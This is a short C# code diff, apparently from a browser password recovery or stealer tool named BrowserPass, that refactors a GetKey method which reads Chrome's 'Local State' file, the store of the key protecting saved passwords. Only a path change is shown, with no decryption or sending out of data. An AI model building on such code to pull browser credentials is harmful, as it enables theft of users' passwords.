@@ -12,13 +12,11 @@ using Org.BouncyCastle.Crypto.Parameters;
 
 namespace BrowserPass
 {
-    public static class GCDecryptor
+    public static class GcDecryptor
     {
         public static byte[] GetKey()
         {
-            var sR = string.Empty;
-            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);// APPDATA
-            var path = Path.GetFullPath(appdata + "\\..\\Local\\Google\\Chrome\\User Data\\Local State");
+            var path = Path.GetFullPath(Helper.AppData.FullName + "\\..\\Local\\Google\\Chrome\\User Data\\Local State");
 
             var v = File.ReadAllText(path);
 
